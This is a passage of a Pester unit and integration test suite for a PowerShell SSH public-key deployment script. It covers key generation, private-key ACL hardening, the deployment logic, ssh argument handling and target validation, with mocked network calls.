                $result = Initialize-KeyPair -KeyPath 'id_ed25519' -KeyType 'ed25519' -Comment 'c' `
                    -SshKeygenPath 'unused-under-whatif' -WhatIf

                $result | Should-Be 'id_ed25519.pub'
            }
            finally {
                Pop-Location
            }
        }
    }

    Context 'ShouldProcess support' {

        It 'generates nothing under -WhatIf' {
            $keyPath = Join-Path $TestDrive 'wi-key\id_ed25519'

            $null = Initialize-KeyPair -KeyPath $keyPath -KeyType 'ed25519' -Comment 'c' `
                -SshKeygenPath 'should-not-run' -WhatIf

            Test-Path $keyPath | Should-BeFalse
        }
    }
}


Describe 'Set-PrivateKeyAcl' -Tag 'Unit' {

    BeforeAll {
        Mock Write-Info {}
        Mock Write-Note {}
    }

    Context 'Core Functionality' {

        It 'strips inheritance and grants the current user sole access' {
            $keyPath = Join-Path $TestDrive 'acl\id_ed25519'
            New-Item -ItemType Directory -Path (Split-Path $keyPath -Parent) -Force | Out-Null
            Set-Content $keyPath 'PRIVATE' -Encoding ascii
            Mock icacls { $global:LASTEXITCODE = 0 }

            Set-PrivateKeyAcl -KeyPath $keyPath

            Should-Invoke icacls -Times 3 -Exactly

            # /reset first. Without it /grant:r replaces one identity's entry and leaves
            # every other explicit ACE in place - which is what ssh-keygen's own SYSTEM and
            # Administrators entries are.
            Should-Invoke icacls -Times 1 -Exactly -ParameterFilter {
                $args -contains '/reset'
            }
            Should-Invoke icacls -Times 1 -Exactly -ParameterFilter {
                $args -contains '/inheritance:r'
            }

            # A SID, not USERDOMAIN\USERNAME: that pair is wrong for Entra-joined and
            # Microsoft-account logins, where the account is AzureAD\user
            $sid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
            Should-Invoke icacls -Times 1 -Exactly -ParameterFilter {
                ($args -join ' ') -match ([regex]::Escape("*${sid}:F"))
            }
            Should-Invoke Write-Info -ParameterFilter { $Message -match 'restricted to' }
        }
    }

    Context 'Applied permissions' -Tag 'Integration' {

        It 'reduces the key ACL to a single entry' -Skip:$script:SkipWithoutAcl {
            $keyPath = Join-Path $TestDrive 'acl-real\id_ed25519'
            New-Item -ItemType Directory -Path (Split-Path $keyPath -Parent) -Force | Out-Null
            Set-Content $keyPath 'PRIVATE' -Encoding ascii

            # Reproduce what ssh-keygen actually leaves behind. A file carrying only
            # INHERITED entries is cleaned up by /inheritance:r alone, which is why this
            # test passed for a long time against code that could not remove an explicit
            # ACE - and why a real generated key kept its SYSTEM and Administrators access.
            $null = & icacls (Convert-Path $keyPath) /grant '*S-1-5-18:F' '*S-1-5-32-544:F'
            $seeded = (Get-Acl -LiteralPath (Convert-Path $keyPath)).GetAccessRules(
                $true, $true, [System.Security.Principal.NTAccount])
            $seeded.Count | Should-BeGreaterThan 1 -Because 'the fixture must start dirty'

            Set-PrivateKeyAcl -KeyPath $keyPath

            # Belt and braces: the discovery probe checks a temp file, so confirm the ACL
            # is readable for this path too rather than failing on a null reference
            $acl = Get-Acl -LiteralPath (Convert-Path $keyPath) -ErrorAction SilentlyContinue
            if ($null -eq $acl) {
                Set-ItResult -Skipped -Because 'this environment does not expose file ACLs'
                return
            }

            # GetAccessRules is a genuine .NET method. The friendlier $acl.Access is a
            # PowerShell CodeProperty supplied by types.ps1xml, so it is missing in
            # runspaces created without the default type data - the VS Code Pester
            # runner among them - which surfaces as a PropertyNotFoundException.
            $rules = $acl.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])

            Should-BeCollection -Actual $rules -Count 1 `
                -Because 'OpenSSH rejects keys readable by others'
            $rules[0].IdentityReference.Value | Should-MatchString ([regex]::Escape($env:USERNAME))
        }
    }

    Context 'Error Handling' {

        It 'reports and returns when the key is missing' {
            $missing = Join-Path $TestDrive 'acl\nokey'

            # No Should-NotThrow in Pester 6; an unhandled exception fails the test
            Set-PrivateKeyAcl -KeyPath $missing

            Should-Invoke Write-Note -ParameterFilter { $Message -match 'not found' }
        }

        It 'warns instead of failing silently when icacls cannot harden the key' {
            $keyPath = Join-Path $TestDrive 'aclfail\id_ed25519'
            New-Item -ItemType Directory -Path (Split-Path $keyPath -Parent) -Force | Out-Null
            Set-Content $keyPath 'PRIVATE' -Encoding ascii

            # icacls signals failure through its exit code, never a terminating error
            Mock icacls { $global:LASTEXITCODE = 5 }

            Set-PrivateKeyAcl -KeyPath $keyPath

            Should-Invoke Write-Note -ParameterFilter { $Message -match 'Could not harden' }
        }
    }

    Context 'ShouldProcess support' {

        It 'runs no icacls command under -WhatIf' {
            $keyPath = Join-Path $TestDrive 'acl-wi\id_ed25519'
            New-Item -ItemType Directory -Path (Split-Path $keyPath -Parent) -Force | Out-Null
            Set-Content $keyPath 'PRIVATE' -Encoding ascii
            Mock icacls { $global:LASTEXITCODE = 0 }

            Set-PrivateKeyAcl -KeyPath $keyPath -WhatIf

            Should-NotInvoke icacls
        }
    }
}


Describe 'Invoke-DeploySshKey' -Tag 'Unit' {

    BeforeAll {
        Mock Write-Info {}
        Mock Write-Ok {}
        Mock Write-Note {}
        Mock Write-Bad {}
        Mock Write-Host {}
        Mock Write-Warning {}

        $script:pubPath = Join-Path $TestDrive 'orch\id_ed25519.pub'
        New-Item -ItemType Directory -Path (Split-Path $script:pubPath -Parent) -Force | Out-Null
        Set-Content $script:pubPath 'ssh-ed25519 AAAATESTKEY test@ws' -Encoding ascii

        # Stands in for ssh-keygen -lf when the fingerprint is displayed
        $script:keygenStub = Join-Path $TestDrive 'orch\keygen.ps1'
        Set-Content $script:keygenStub "'256 SHA256:stub test@ws (ED25519)'" -Encoding ascii

        Mock Get-OpenSshTool {
            [pscustomobject]@{
                PSTypeName = 'OpenSshToolPath'
                Ssh        = 'ssh-stub'
                SshKeygen  = $script:keygenStub
                Sftp       = 'sftp-stub'
            }
        }
        Mock Initialize-KeyPair { $script:pubPath }
        Mock Set-PrivateKeyAcl {}

        # Install-PublicKey now reports what the session actually did, so the orchestration
        # can tell "could not connect" from "wrote the key but sshd will not read it"
        Mock Install-PublicKey {
            [pscustomobject]@{
                PSTypeName = 'SshKeyInstallResult'
                Attempted  = $true
                ExitCode   = 0
                Reported   = $true
                KeyFile    = '/home/root/.ssh/authorized_keys'
                KeysAdded  = 1
                Warning    = @()
                Output     = @('KEY_INSTALLED_OK')
            }
        }

        # The key is unencrypted in these tests, so probes stay meaningful
        Mock Test-PrivateKeyEncrypted { $false }

        # Nothing here should reach the real ssh client to read a config
        Mock Get-SshEffectiveConfig {
            [pscustomobject]@{
                PSTypeName = 'SshEffectiveConfig'
                HostName   = ''
                User       = ''
                Port       = 0
            }
        }

        # Without this the orchestration tests would open real sockets to 10.0.0.5
        Mock Resolve-RemotePlatform { 'Linux' }

        function Get-DeployParam {
            @{
                ComputerName  = 'root@10.0.0.5'
                User          = 'root'
                Port          = 22
                KeyPath       = (Join-Path $TestDrive 'orch\id_ed25519')
                KeyType       = 'ed25519'
                Comment       = 'test@ws'
                CorrelationId = 'test-correlation-id'
                SshConfigPath = (Join-Path $TestDrive 'orch\config')
            }
        }
    }

    Context 'Core Functionality' {

        It 'reports AlreadyConfigured and skips installation' {
            Mock Test-PasswordlessAccess { $true }

            $deployParam = Get-DeployParam
            $result = Invoke-DeploySshKey @deployParam

            $result.Status | Should-Be 'AlreadyConfigured'
            Should-NotInvoke Install-PublicKey
        }

        It 'installs once and reports Installed' {
            $script:probeCount = 0
            Mock Test-PasswordlessAccess {
                $script:probeCount++
                return ($script:probeCount -gt 1)
            }

            $deployParam = Get-DeployParam
            $result = Invoke-DeploySshKey @deployParam

            $result.Status | Should-Be 'Installed'
            Should-Invoke Install-PublicKey -Times 1 -Exactly
        }

        It 'returns a typed result carrying the correlation id' {
            Mock Test-PasswordlessAccess { $true }

            $deployParam = Get-DeployParam
            $result = Invoke-DeploySshKey @deployParam

            $result.PSObject.TypeNames[0] | Should-Be 'SshKeyDeploymentResult'
            $result | Should-BeEquivalent ([pscustomobject]@{
                    ComputerName     = 'root@10.0.0.5'
                    Status           = 'AlreadyConfigured'
                    CorrelationId    = 'test-correlation-id'
                    SshConfigUpdated = $false
                }) -ExcludePathsNotOnExpected
        }
    }

    Context 'Platform handling' {

        It 'sends the POSIX command to a Linux target and pipes the key' {
            $script:probeCount = 0
            Mock Test-PasswordlessAccess {
                $script:probeCount++
                return ($script:probeCount -gt 1)
            }

            $deployParam = Get-DeployParam
            $result = Invoke-DeploySshKey @deployParam

            $result.Platform | Should-Be 'Linux'
            Should-Invoke Install-PublicKey -Times 1 -Exactly -ParameterFilter {
                # Auto picks the transport from this host's quoting behaviour, so accept
                # either form and look at the script body whichever way it was delivered
                $body = if ($RemoteCommand -match '^echo ([A-Za-z0-9+/=]+) \| base64 -d \| sh$') {
                    [System.Text.Encoding]::UTF8.GetString(
                        [System.Convert]::FromBase64String($Matches[1]))
                }
                else {
                    $RemoteCommand
                }
                $body -match '\$HOME/\.ssh/authorized_keys'
            }
        }

        It 'sends the encoded PowerShell command to a Windows target' {
            Mock Resolve-RemotePlatform { 'Windows' }
            $script:probeCount = 0
            Mock Test-PasswordlessAccess {
                $script:probeCount++
                return ($script:probeCount -gt 1)
            }

            $deployParam = Get-DeployParam
            $result = Invoke-DeploySshKey @deployParam -TargetPlatform 'Windows'

            $result.Platform | Should-Be 'Windows'
            Should-Invoke Install-PublicKey -Times 1 -Exactly -ParameterFilter {
                $RemoteCommand -match '^powershell -NoProfile'
            }
        }

        It 'carries the requested key location into the Windows command' {
            Mock Resolve-RemotePlatform { 'Windows' }
            Mock Test-PasswordlessAccess { $false }

            $deployParam = Get-DeployParam
            $null = Invoke-DeploySshKey @deployParam -TargetPlatform 'Windows' `
                -WindowsKeyLocation 'UserProfile'

            Should-Invoke Install-PublicKey -Times 1 -Exactly -ParameterFilter {
                $encoded = ($RemoteCommand -split ' ')[-1]
                $decoded = [System.Text.Encoding]::Unicode.GetString(
                    [System.Convert]::FromBase64String($encoded))
                $decoded -match [regex]::Escape('$useAdminFile = $false')
            }
        }

        It 'builds no POSIX command for a Windows target' {
            # The POSIX builder used to run for every host and have its result discarded on a
            # Windows one. It refuses a -PosixTransport the client cannot honour, so
            # "-TargetPlatform Windows -PosixTransport Direct" aborted the entire run from a
            # client that mangles quotes - over a setting documented as not applying here.
            # Asserting the call never happens pins the fix on a quote-safe client too, where
            # the old code merely wasted the work instead of failing.
            Mock Resolve-RemotePlatform { 'Windows' }
            Mock New-PosixInstallCommand { 'should not be reached' }
            Mock Test-PasswordlessAccess { $false }

            $deployParam = Get-DeployParam
            $null = Invoke-DeploySshKey @deployParam -TargetPlatform 'Windows' `
                -PosixTransport 'Direct'

            Should-NotInvoke New-PosixInstallCommand
        }

        It 'builds no shell command at all on the sftp path' {
            # -UseSftp sends a file, never a command, so neither builder should run. The POSIX
            # one refusing an unavailable transport would otherwise abort a deployment whose
            # transport is irrelevant.
            Mock Install-PublicKeySftp {
                [pscustomobject]@{
                    PSTypeName = 'SshKeyInstallResult'
                    Attempted  = $true
                    ExitCode   = 0
                    Reported   = $true
                    KeyFile    = '.ssh/authorized_keys'
                    KeysAdded  = 1
                    Warning    = @()
                    Output     = @()
                }
            }
            Mock New-PosixInstallCommand { 'should not be reached' }
            Mock New-WindowsInstallCommand { 'should not be reached' }
            Mock Test-PasswordlessAccess { $false }

            $deployParam = Get-DeployParam
            $null = Invoke-DeploySshKey @deployParam -UseSftp -PosixTransport 'Direct'

            Should-Invoke Install-PublicKeySftp -Times 1 -Exactly
            Should-NotInvoke New-PosixInstallCommand
            Should-NotInvoke New-WindowsInstallCommand
            Should-NotInvoke Install-PublicKey
        }

        It 'resolves the platform once per host' {
            Mock Test-PasswordlessAccess { $true }

            $deployParam = Get-DeployParam
            $deployParam.ComputerName = @('root@10.0.0.5', 'root@10.0.0.6')

            $null = Invoke-DeploySshKey @deployParam

            Should-Invoke Resolve-RemotePlatform -Times 2 -Exactly
        }

        It 'reports the platform-specific remediation hint on failure' {
            Mock Resolve-RemotePlatform { 'Windows' }
            Mock Test-PasswordlessAccess { $false }
            Mock Write-RemediationHint {}

            $deployParam = Get-DeployParam
            $null = Invoke-DeploySshKey @deployParam -TargetPlatform 'Windows'

            Should-Invoke Write-RemediationHint -Times 1 -Exactly -ParameterFilter {
                $Platform -eq 'Windows'
            }
        }
    }

    Context 'Error Handling' {

        It 'blames base64, not sshd, when the target cannot decode the payload' {
            # BSD and macOS spell the decode flag -D where GNU uses -d, so the encoded
            # transport dies on those hosts. The generic hint sends the operator to inspect
            # PubkeyAuthentication and ~/.ssh permissions, which is the wrong building
            # entirely - verified against a container whose base64 rejects -d.
            Mock Test-PasswordlessAccess { $false }
            Mock Write-RemediationHint {}
            Mock Install-PublicKey {
                [pscustomobject]@{
                    PSTypeName = 'SshKeyInstallResult'
                    Attempted  = $true
                    ExitCode   = 1
                    Reported   = $false
                    KeyFile    = ''
                    KeysAdded  = 0
                    Warning    = @()
                    Output     = @(
                        'base64: illegal option -- d'
                        'usage: base64 [-Ddh] [-b num] [-i in_file] [-o out_file]'
                    )
                }
            }

            $deployParam = Get-DeployParam
            $null = Invoke-DeploySshKey @deployParam

            Should-Invoke Write-Note -ParameterFilter { $Message -match 'base64 on the target, not from sshd' }
            Should-NotInvoke Write-RemediationHint
        }

        It 'still gives the platform hint when the failure is not about base64' {
            Mock Test-PasswordlessAccess { $false }
            Mock Write-RemediationHint {}
            Mock Install-PublicKey {
                [pscustomobject]@{
                    PSTypeName = 'SshKeyInstallResult'
                    Attempted  = $true
                    ExitCode   = 1
                    Reported   = $false
                    KeyFile    = ''
                    KeysAdded  = 0
                    Warning    = @()
                    Output     = @('Permission denied (publickey,password).')
                }
            }

            $deployParam = Get-DeployParam
            $null = Invoke-DeploySshKey @deployParam

            Should-Invoke Write-RemediationHint -Times 1 -Exactly
        }

        It 'reports Failed rather than claiming success' {
            Mock Test-PasswordlessAccess { $false }

            $deployParam = Get-DeployParam
            $result = Invoke-DeploySshKey @deployParam

            $result.Status | Should-Be 'Failed'
            Should-Invoke Install-PublicKey -Times 1 -Exactly
        }

        It 'stops before contacting hosts when no public key was produced' {
            Mock Test-PasswordlessAccess { $true }
            Mock Initialize-KeyPair { Join-Path $TestDrive 'orch\never-created.pub' }

            $deployParam = Get-DeployParam
            $result = Invoke-DeploySshKey @deployParam

            $result | Should-BeNull
            Should-NotInvoke Test-PasswordlessAccess
        }

        It 'terminates rather than deploying an empty public key' {
            $emptyPub = Join-Path $TestDrive 'orch\empty.pub'
            Set-Content $emptyPub '' -Encoding ascii
            Mock Initialize-KeyPair { $emptyPub }

            $deployParam = Get-DeployParam

            # Guards the null-dereference that Get-Content -Raw returns for an empty file
            { Invoke-DeploySshKey @deployParam } |
                Should-Throw -ExceptionMessage '*empty or unreadable*'
        }
    }

    Context 'ssh argument construction' {

        It 'omits -p unless the caller named the port' {
            # Forcing -p 22 overrides any Port in the client config, including a block this
            # script wrote itself with -UpdateSshConfig
            Mock Test-PasswordlessAccess { $true }

            $deployParam = Get-DeployParam
            $null = Invoke-DeploySshKey @deployParam

            Should-Invoke Test-PasswordlessAccess -ParameterFilter {
                $CommonArgs -notcontains '-p'
            }
        }

        It 'passes -p when the caller named the port' {
            Mock Test-PasswordlessAccess { $true }

            $deployParam = Get-DeployParam
            $deployParam.Port = 2222
            $null = Invoke-DeploySshKey @deployParam -PortSpecified

            Should-Invoke Test-PasswordlessAccess -ParameterFilter {
                ($CommonArgs -join ' ') -match '-p 2222'
            }
        }

        It 'places -SshOption ahead of the defaults, because ssh keeps the first value' {
            Mock Test-PasswordlessAccess { $true }

            $deployParam = Get-DeployParam
            $null = Invoke-DeploySshKey @deployParam -SshOption @('ProxyJump=bastion')

            Should-Invoke Test-PasswordlessAccess -ParameterFilter {
                $joined = $CommonArgs -join ' '
                $joined.IndexOf('ProxyJump=bastion') -lt $joined.IndexOf('IdentitiesOnly')
            }
        }

        It 'carries -StrictHostKeyChecking through to every session' {
            Mock Test-PasswordlessAccess { $true }

            $deployParam = Get-DeployParam
            $null = Invoke-DeploySshKey @deployParam -StrictHostKeyChecking 'yes'

            Should-Invoke Test-PasswordlessAccess -ParameterFilter {
                $CommonArgs -contains 'StrictHostKeyChecking=yes'
            }
        }

        It 'sends no -F unless one was asked for' {
            # Without -SshConfigFile, ssh reads its own defaults - including the system-wide
            # config that any -F would suppress. -SshConfigPath must never become an -F: it
            # is a write target -UpdateSshConfig may not have created yet, and ssh exits 255
            # on a -F file that does not exist.
            Mock Test-PasswordlessAccess { $true }

            $deployParam = Get-DeployParam
            $null = Invoke-DeploySshKey @deployParam -ClientConfigPath $script:pubPath

            Should-Invoke Test-PasswordlessAccess -ParameterFilter {
                $CommonArgs -notcontains '-F'
            }
        }

        It 'sends -F when a client config file is named, ahead of the other options' {
            # ssh-copy-id -F. First in the list so there is no doubt which file the run
            # resolved against; -o values on the command line still beat its contents.
            Mock Test-PasswordlessAccess { $true }

            $configFile = Join-Path $TestDrive 'orch\alt_ssh_config'
            Set-Content $configFile "Host *`n    User someone" -Encoding ascii

            $deployParam = Get-DeployParam
            $null = Invoke-DeploySshKey @deployParam -SshConfigFile $configFile `
                -SshOption @('ProxyJump=bastion')

            Should-Invoke Test-PasswordlessAccess -ParameterFilter {
                $joined = $CommonArgs -join ' '
                $CommonArgs[0] -eq '-F' -and $CommonArgs[1] -eq $configFile -and
                $joined.IndexOf('-F ') -lt $joined.IndexOf('ProxyJump')
            }
        }

        It 'resolves user and port against the named config rather than the default one' {
            # -F changes which file ssh reads, so Get-SshEffectiveConfig has to read it too.
            # Otherwise an alias defined only in that file resolves as a bare hostname.
            Mock Test-PasswordlessAccess { $true }
            Mock Get-SshEffectiveConfig {
                [pscustomobject]@{
                    PSTypeName = 'SshEffectiveConfig'
                    HostName   = '10.0.0.5'
                    User       = 'root'
                    Port       = 2222
                }
            }

            $configFile = Join-Path $TestDrive 'orch\resolve_config'
            Set-Content $configFile "Host *`n    Port 2222" -Encoding ascii

            $deployParam = Get-DeployParam
            $result = Invoke-DeploySshKey @deployParam -SshConfigFile $configFile

            # Consulted at all, and its port reached the result
            Should-Invoke Get-SshEffectiveConfig
            $result.Port | Should-Be 2222
        }

        It 'stops on a config file that does not exist instead of letting ssh exit 255' {
            # ssh reports a missing -F as a generic failure, which this script would surface
            # as a transport or authentication problem - sending the operator to check
            # passwords and firewalls over a typo in a path.
            $deployParam = Get-DeployParam
            $missing = Join-Path $TestDrive 'orch\nope.config'

            { Invoke-DeploySshKey @deployParam -SshConfigFile $missing } |
                Should-Throw -ExceptionMessage '*config file not found*'
        }

        It 'resolves against the client config, not the file it writes to' {
            Mock Test-PasswordlessAccess { $true }
            Mock Get-SshEffectiveConfig {
                [pscustomobject]@{
                    PSTypeName = 'SshEffectiveConfig'
                    HostName   = '192.168.66.48'
                    User       = 'administrator'
                    Port       = 2222
                }
            }

            $deployParam = Get-DeployParam
            # SshConfigPath does not exist; only the client config governs resolution
            $result = Invoke-DeploySshKey @deployParam -ClientConfigPath $script:pubPath

            Should-Invoke Resolve-RemotePlatform -ParameterFilter {
                $ResolvedHostAddress -eq '192.168.66.48' -and $Port -eq 2222
            }
            $result.Port | Should-Be 2222
        }

        It 'skips resolution entirely when there is no client config to read' {
            Mock Test-PasswordlessAccess { $true }
            Mock Get-SshEffectiveConfig { throw 'no config, so no lookup may run' }

            $deployParam = Get-DeployParam
            $null = Invoke-DeploySshKey @deployParam `
                -ClientConfigPath (Join-Path $TestDrive 'orch\no-such-config')

            Should-NotInvoke Get-SshEffectiveConfig
        }

        It 'uses the private key when -KeyPath names the public half' {
            # ssh-copy-id is given the .pub, so operators reach for it here too
            Mock Test-PasswordlessAccess { $true }

            $deployParam = Get-DeployParam
            $deployParam.KeyPath = "$($deployParam.KeyPath).pub"
            $null = Invoke-DeploySshKey @deployParam

            Should-Invoke Test-PasswordlessAccess -ParameterFilter {
                $CommonArgs -notcontains "$($TestDrive)\orch\id_ed25519.pub"
            }
        }
    }

    Context 'Forcing the install' {

        It 'skips the pre-check when a specific remote file was named' {
            # The pre-check answers "does this key already grant access", not "is it in the
            # file you named". On a host reachable through another authorized_keys file it
            # would otherwise skip the install that was explicitly requested.
            Mock Test-PasswordlessAccess { $true }

            $deployParam = Get-DeployParam
            $result = Invoke-DeploySshKey @deployParam -RemoteAuthorizedKeysPath '/root/other_keys'

            $result.Status | Should-Be 'Installed'
            Should-Invoke Install-PublicKey -Times 1 -Exactly
        }

        It 'skips the pre-check with -ForceInstall' {
            Mock Test-PasswordlessAccess { $true }

            $deployParam = Get-DeployParam
            $result = Invoke-DeploySshKey @deployParam -ForceInstall

            $result.Status | Should-Be 'Installed'
            Should-Invoke Install-PublicKey -Times 1 -Exactly
        }

        It 'honours the pre-check by default' {
            Mock Test-PasswordlessAccess { $true }

            $deployParam = Get-DeployParam
            $result = Invoke-DeploySshKey @deployParam

            $result.Status | Should-Be 'AlreadyConfigured'
            Should-NotInvoke Install-PublicKey
        }
    }

    Context 'Passphrase-protected keys' {

        It 'installs without probing, and says the result is unverified' {
            # BatchMode cannot supply a passphrase, so probing would report Failed for every
            # host even where the key works. Trust the remote sentinel instead.
            Mock Test-PrivateKeyEncrypted { $true }
            Mock Test-SshAgentHasKey { $false }
            Mock Test-PasswordlessAccess { throw 'no probe may run for an encrypted key' }

            $deployParam = Get-DeployParam
            $result = Invoke-DeploySshKey @deployParam

            $result.Status | Should-Be 'Installed'
            $result.Verified | Should-BeFalse
        }

        It 'probes normally when the agent holds the key' {
            Mock Test-PrivateKeyEncrypted { $true }
            Mock Test-SshAgentHasKey { $true }
            Mock Test-PasswordlessAccess { $true }

            $deployParam = Get-DeployParam
            $result = Invoke-DeploySshKey @deployParam

            $result.Status | Should-Be 'AlreadyConfigured'
            $result.Verified | Should-BeTrue
        }
    }

    Context 'Result detail' {

        It 'records the file the remote host reported' {
            $script:probeCount = 0
            Mock Test-PasswordlessAccess {
                $script:probeCount++
                return ($script:probeCount -gt 1)
            }

            $deployParam = Get-DeployParam
            $result = Invoke-DeploySshKey @deployParam

            $result.RemoteKeyFile | Should-Be '/home/root/.ssh/authorized_keys'
            $result.Verified | Should-BeTrue
        }

        It 'reports Skipped rather than Failed when -WhatIf declined the install' {
            Mock Test-PasswordlessAccess { $false }
            Mock Install-PublicKey {
                [pscustomobject]@{
                    PSTypeName = 'SshKeyInstallResult'
                    Attempted  = $false
                    ExitCode   = $null
                    Reported   = $false
                    KeyFile    = ''
                    KeysAdded  = 0
                    Warning    = @()
                    Output     = @()
                }
            }

            $deployParam = Get-DeployParam
            $result = Invoke-DeploySshKey @deployParam

            $result.Status | Should-Be 'Skipped'
        }

        It 'names the keys it would have added, the way ssh-copy-id -n does' {
            # The ShouldProcess message says an install would happen, not which identity it
            # would deploy - and that is the whole question a dry run is asked, especially
            # when the key may have been generated moments ago or drawn from a loaded agent.
            Mock Test-PasswordlessAccess { $false }
            Mock Install-PublicKey {
                [pscustomobject]@{
                    PSTypeName = 'SshKeyInstallResult'
                    Attempted  = $false
                    ExitCode   = $null
                    Reported   = $false
                    KeyFile    = ''
                    KeysAdded  = 0
                    Warning    = @()
                    Output     = @()
                }
            }

            $deployParam = Get-DeployParam
            $null = Invoke-DeploySshKey @deployParam

            Should-Invoke Write-Note -ParameterFilter {
                $Message -match 'Would have added 1 key\(s\) to root@10\.0\.0\.5'
            }
            Should-Invoke Write-Host -ParameterFilter {
                $Object -match 'ssh-ed25519'
            }
        }

        It 'terminates rather than deploying a public key file holding two keys' {
            $twoKeys = Join-Path $TestDrive 'orch\two.pub'
            Set-Content $twoKeys @('ssh-ed25519 AAAAONE a@b', 'ssh-rsa BBBB c@d') -Encoding ascii
            Mock Initialize-KeyPair { $twoKeys }

            $deployParam = Get-DeployParam

            { Invoke-DeploySshKey @deployParam } |
                Should-Throw -ExceptionMessage '*more than one line*'
        }
    }

    Context 'Target validation' -Tag 'Security' {

        It 'drops invalid targets and warns instead of passing them to ssh' {
            Mock Test-PasswordlessAccess { $true }
            $deployParam = Get-DeployParam
            $deployParam.ComputerName = @('root@10.0.0.5', 'bad host@lab2')

            $result = @(Invoke-DeploySshKey @deployParam)

            Should-BeCollection -Actual $result -Count 1
            $result[0].ComputerName | Should-Be 'root@10.0.0.5'
            Should-Invoke Write-Warning -ParameterFilter { $Message -match 'Rejected target' }
        }

        It 'terminates when no target survives validation' {
            $deployParam = Get-DeployParam
            $deployParam.ComputerName = @('bad host@lab2')

            { Invoke-DeploySshKey @deployParam } |
                Should-Throw -ExceptionMessage '*No valid target hosts*'
        }
    }

    Context 'Ssh config integration' {

        It 'records an entry for a reachable host' {
            Mock Test-PasswordlessAccess { $true }
            Mock Update-SshConfigEntry { $true }

            $deployParam = Get-DeployParam
            $result = Invoke-DeploySshKey @deployParam -UpdateSshConfig

            Should-Invoke Update-SshConfigEntry -Times 1 -Exactly
            $result.SshConfigUpdated | Should-BeTrue
        }

        It 'writes no entry for a host that failed' {
            Mock Test-PasswordlessAccess { $false }
            Mock Update-SshConfigEntry { $true }

            $deployParam = Get-DeployParam
            $null = Invoke-DeploySshKey @deployParam -UpdateSshConfig

            Should-NotInvoke Update-SshConfigEntry
        }

        It 'ignores an alias when several hosts are processed' {
            Mock Test-PasswordlessAccess { $true }
            Mock Update-SshConfigEntry { $true }

            $deployParam = Get-DeployParam
            $deployParam.ComputerName = @('root@10.0.0.5', 'root@10.0.0.6')

            $null = Invoke-DeploySshKey @deployParam -UpdateSshConfig -ConfigAlias 'pve'

            Should-Invoke Write-Warning -ParameterFilter { $Message -match 'ConfigAlias' }
            Should-Invoke Update-SshConfigEntry -Times 2 -Exactly -ParameterFilter { $Alias -eq '' }
        }
    }
}


Describe 'New-SampleHostFile' -Tag 'Unit' {

    BeforeAll {
        Mock Write-Info {}
        Mock Write-Ok {}
        Mock Write-Note {}
    }

    Context 'Core Functionality' {

        It 'includes the default user and usage guidance' {
            $path = Join-Path $TestDrive 'sample\hosts.txt'

            $result = New-SampleHostFile -Path $path -DefaultUser 'jeff'

            $result | Should-BeTrue
            $content = Get-Content $path -Raw
            $content | Should-MatchString 'currently: jeff'
            $content | Should-MatchString 'Deploy-SshKey\.ps1 -HostFile'
        }

        It 'comments out every example so a fresh template targets no hosts' {
            $path = Join-Path $TestDrive 'empty\hosts.txt'
            $null = New-SampleHostFile -Path $path -DefaultUser 'jeff'

            $actionable = @(Get-Content $path |
                    Where-Object { $_.Trim() -and -not $_.Trim().StartsWith('#') })

            Should-BeCollection -Actual $actionable -Count 0 `
                -Because 'a generated file must target no host'
        }

        It 'creates the parent directory when missing' {
            $path = Join-Path $TestDrive 'deep\nested\hosts.txt'

            $null = New-SampleHostFile -Path $path -DefaultUser 'jeff'

            Test-Path $path | Should-BeTrue
        }
    }

    Context 'Overwrite protection' {

        It 'does not overwrite an existing file when confirmation is unavailable' {
            $path = Join-Path $TestDrive 'keep\hosts.txt'
            New-Item -ItemType Directory -Path (Split-Path $path -Parent) -Force | Out-Null
            Set-Content $path 'my-curated-list' -Encoding ascii

            $result = New-SampleHostFile -Path $path -DefaultUser 'jeff'

            $result | Should-BeFalse
            (Get-Content $path) | Should-ContainCollection @('my-curated-list')
        }

        It 'overwrites an existing file with -Force' {
            $path = Join-Path $TestDrive 'clobber\hosts.txt'
            New-Item -ItemType Directory -Path (Split-Path $path -Parent) -Force | Out-Null
            Set-Content $path 'my-curated-list' -Encoding ascii

            $result = New-SampleHostFile -Path $path -DefaultUser 'jeff' -Force

            $result | Should-BeTrue
            (Get-Content $path) | Should-NotContainCollection @('my-curated-list')
            (Get-Content $path)[0] | Should-MatchString '^# Host list'
        }
    }

    Context 'ShouldProcess support' {

        It 'makes no change under -WhatIf' {
            $path = Join-Path $TestDrive 'wi\hosts.txt'

            $null = New-SampleHostFile -Path $path -DefaultUser 'jeff' -WhatIf

            Test-Path $path | Should-BeFalse
        }
    }
}


Describe 'Script entry point' -Tag 'Unit' {

    BeforeAll {
        # These tests execute the script rather than dot-sourcing it, so the guarded main
        # body runs. Both paths stay offline: the template mode never contacts a host, and
        # the failure path aborts during target validation, before any key or network work.
        $script:scriptUnderTest = Join-Path $PSScriptRoot 'Deploy-SshKey.ps1'
    }

    Context 'Core Functionality' {

        It 'writes the template to an explicit -HostFile path' {
            $target = Join-Path $TestDrive 'entry\hosts.txt'
            New-Item -ItemType Directory -Path (Split-Path $target -Parent) -Force | Out-Null

            & $script:scriptUnderTest -CreateSampleHostFile -HostFile $target *> $null

            (Get-Content $target)[0] | Should-MatchString '^# Host list'
        }

        It 'defaults to hosts.example.txt in the working directory' {
            $dir = Join-Path $TestDrive 'entrydefault'
            New-Item -ItemType Directory -Path $dir -Force | Out-Null

            Push-Location $dir
            try {
                & $script:scriptUnderTest -CreateSampleHostFile *> $null
            }
            finally {
                Pop-Location
            }

            Test-Path (Join-Path $dir 'hosts.example.txt') | Should-BeTrue
        }
    }

    Context 'Pipeline input' {

        # These pipe targets that fail validation on purpose. The run aborts during target
        # validation, before any key is touched or any host contacted, so the assertions
        # stay offline while still exercising the real begin/process/end plumbing.

        It 'collects every piped host, not just the one that arrived last' {
            # The whole point of the process block. Without it the body would be an implicit
            # end block and only the final object would ever bind.
            $warnings = @()
            try {
                @('jeff@bad!one', 'jeff@bad!two', 'jeff@bad!three') |
                    & $script:scriptUnderTest -WarningVariable +warnings -WarningAction SilentlyContinue *> $null
            }
            catch {
                Write-Verbose "Expected terminating error: $($_.Exception.Message)"
            }

            @($warnings | Where-Object { $_ -match 'Rejected target' }) | Should-BeCollection -Count 3
        }

        It 'binds objects by property name so an inventory needs no reshaping' {
            $warnings = @()
            try {
                @(
                    [pscustomobject]@{ ComputerName = 'jeff@bad!alpha' }
                    [pscustomobject]@{ ComputerName = 'jeff@bad!beta' }
